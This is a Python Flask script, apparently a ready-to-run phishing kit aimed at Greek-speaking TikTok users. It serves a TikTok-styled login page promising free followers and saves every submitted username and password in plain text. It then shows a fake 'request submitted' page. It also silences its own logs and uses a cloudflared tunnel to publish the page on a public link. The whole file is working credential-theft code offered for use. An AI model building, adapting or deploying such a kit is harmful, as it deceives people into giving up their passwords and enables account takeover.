import os
import sys
import subprocess
import re
import threading
import time
import logging
from flask import Flask, render_template_string, request, redirect, url_for
from datetime import datetime
from werkzeug.utils import secure_filename

# Auto-install missing packages quietly
def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

# Flask app setup
app = Flask(__name__)

# Suppress Flask and Werkzeug logs completely
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

# Also silence Flask's startup messages by redirecting output temporarily
class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

# Data saving folder
BASE_FOLDER = os.path.expanduser("~/storage/downloads/TikFollowers")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Tik Followers - Αποκτήστε Δωρεάν Ακολούθους στο TikTok</title>
        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
        <style>
            :root {
                /* Light theme colors */
                --bg-light: #ffffff;
                --text-light: #161823;
                --container-bg-light: #ffffff;
                --border-light: #e3e4e6;
                --input-bg-light: #f1f1f2;
                --input-border-light: #e3e4e6;
                --button-bg-light: #fe2c55;
                --button-hover-light: #eb274c;
                --link-light: #fe2c55;
            }

            @media (prefers-color-scheme: dark) {
                :root {
                    /* Dark theme colors (TikTok-like) */
                    --bg-light: #161823;
                    --text-light: #ffffff;
                    --container-bg-light: #242526;
                    --border-light: #3e4042;
                    --input-bg-light: #3a3b3c;
                    --input-border-light: #555555;
                    --button-bg-light: #fe2c55;
                    --button-hover-light: #eb274c;
                    --link-light: #fe2c55;
                }
            }

            /* General Body Styles */
            body {
                font-family: 'Roboto', -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
                background-color: var(--bg-light);
                color: var(--text-light);
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                margin: 0;
                padding: 20px;
                box-sizing: border-box;
                transition: background-color 0.3s, color 0.3s;
            }

            /* Main container for the form elements */
            .container {
                display: flex;
                flex-direction: column;
                align-items: center;
                width: 100%;
                max-width: 380px;
                text-align: center;
            }

            /* Styling for the main login box */
            .login-box {
                background-color: var(--container-bg-light);
                border: 1px solid var(--border-light);
                width: 100%;
                padding: 30px;
                margin-bottom: 20px;
                box-sizing: border-box;
                border-radius: 8px;
                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
                transition: background-color 0.3s, border-color 0.3s, box-shadow 0.3s;
            }

            /* Logo/Title */
            .logo-container {
                margin-bottom: 30px;
                display: flex;
                flex-direction: column;
                align-items: center;
            }

            .musical-note-icon {
                width: 80px;
                height: 80px;
                margin-bottom: 15px;
                fill: var(--text-light);
                transition: fill 0.3s;
            }

            .logo-title {
                font-family: 'Roboto', sans-serif;
                font-size: 2.5em;
                color: var(--text-light);
                font-weight: 700;
                margin: 0;
                transition: color 0.3s;
            }

            /* Input fields for username and password */
            .input-field input {
                width: 100%;
                padding: 15px;
                margin-bottom: 15px;
                border: 1px solid var(--input-border-light);
                border-radius: 5px;
                background-color: var(--input-bg-light);
                font-size: 16px;
                box-sizing: border-box;
                color: var(--text-light);
                transition: background-color 0.3s, border-color 0.3s, color 0.3s;
            }
            .input-field input::placeholder {
                color: #a7a7a7;
                opacity: 0.8;
            }
            .input-field input:focus {
                border-color: var(--button-bg-light);
                outline: none;
            }

            /* Login button */
            .login-button {
                width: 100%;
                padding: 15px;
                border: none;
                border-radius: 5px;
                background-color: var(--button-bg-light);
                color: white;
                font-weight: 600;
                font-size: 18px;
                cursor: pointer;
                margin-top: 10px;
                transition: background-color 0.2s ease;
            }
            .login-button:hover {
                background-color: var(--button-hover-light);
            }
            
            /* Forgot password link */
            .forgot-password {
                display: block;
                color: var(--link-light);
                font-size: 14px;
                text-decoration: none;
                margin-top: 15px;
                margin-bottom: 20px;
                transition: color 0.3s;
            }
            .forgot-password:hover {
                text-decoration: underline;
            }

            /* Sign up section */
            .signup-section {
                background-color: var(--container-bg-light);
                border: 1px solid var(--border-light);
                width: 100%;
                padding: 20px;
                box-sizing: border-box;
                border-radius: 8px;
                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
                transition: background-color 0.3s, border-color 0.3s, box-shadow 0.3s;
            }

            .signup-section p {
                margin: 0;
                font-size: 15px;
            }
            .signup-section a {
                color: var(--link-light);
                font-weight: 600;
                text-decoration: none;
                transition: color 0.3s;
            }
            .signup-section a:hover {
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="login-box">
                <div class="logo-container">
                    <svg class="musical-note-icon" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6zm-2 16c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/>
                    </svg>
                    <h1 class="logo-title">Tik Followers</h1>
                </div>
                <form action="/login" method="post">
                    <div class="input-field">
                        <input type="text" name="username" placeholder="Όνομα χρήστη ή email" required>
                    </div>
                    <div class="input-field">
                        <input type="password" name="password" placeholder="Κωδικός πρόσβασης" required>
                    </div>
                    <button type="submit" class="login-button">Αποκτήστε Ακόλουθους Τώρα</button>
                </form>
                <a href="#" class="forgot-password">Ξεχάσατε τον κωδικό πρόσβασης;</a>
            </div>
            <div class="signup-section">
                <p>Δεν έχετε λογαριασμό; <a href="#">Εγγραφή</a></p>
            </div>
        </div>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()

    if not username or not password:
        return "Απαιτείται όνομα χρήστη και κωδικός πρόσβασης!", 400

    safe_username = secure_filename(username)
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Όνομα χρήστη: {username}\n")
        file.write(f"Κωδικός πρόσβασης: {password}\n")
        file.write(f"Χρονική σήμανση: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <meta name="color-scheme" content="light dark" />
      <title>Η Αίτηση Υποβλήθηκε!</title>
      <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet" />
      <style>
        :root {
          --primary-success: #28a745;
          --bg-light: #ffffff;
          --text-light: #161823;
          --container-bg-light: #ffffff;
          --shadow-light: rgba(0,0,0,0.1);
        }
        @media (prefers-color-scheme: dark) {
          :root {
            --primary-success: #28a745;
            --bg-light: #161823;
            --text-light: #ffffff;
            --container-bg-light: #242526;
            --shadow-light: rgba(0,0,0,0.3);
          }
        }
        body {
          font-family: 'Roboto', sans-serif;
          margin:0; padding:20px;
          display:flex; justify-content:center;
          min-height: 100vh;
          align-items: center;
          background-color: var(--bg-light);
          color: var(--text-light);
          transition: background-color 0.3s, color 0.3s;
        }
        .container {
          padding: 40px;
          max-width: 600px;
          width: 100%;
          border-radius: 8px;
          box-sizing: border-box;
          text-align: center;
          background: var(--container-bg-light);
          border-left: 4px solid var(--primary-success);
          box-shadow: 0 4px 20px var(--shadow-light);
          transition: background-color 0.3s, border-color 0.3s, box-shadow 0.3s;
        }
        h2 {
          margin-top: 0;
          font-weight: 700;
          font-size: 1.8em;
          margin-bottom: 10px;
          color: var(--primary-success);
          transition: color 0.3s;
        }
        p {
          font-size: 1.1em;
          margin-top: 20px;
          line-height: 1.4;
        }
      </style>
      <meta http-equiv="refresh" content="3; url=/" />
    </head>
    <body>
      <div class="container">
        <h2>Η Αίτηση Υποβλήθηκε!</h2>
        <p>Η αίτησή σας για ακολούθους υποβλήθηκε.<br>Θα ανακατευθυνθείτε σε λίγο.</p>
      </div>
    </body>
    </html>
    '''
    )

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--protocol", "http2", "--url", local_url]

    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    tunnel_url = None
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"Δημόσια Σύνδεση Tik Followers: {tunnel_url}")
            sys.stdout.flush()
            break
    return process

if __name__ == '__main__':
    # Suppress Flask startup messages by redirecting stdout/stderr temporarily
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    # Run flask app in a separate thread so we can run cloudflared tunnel simultaneously
    def run_flask():
        app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    # Restore stdout/stderr after server starts
    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5000")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        sys.exit(0)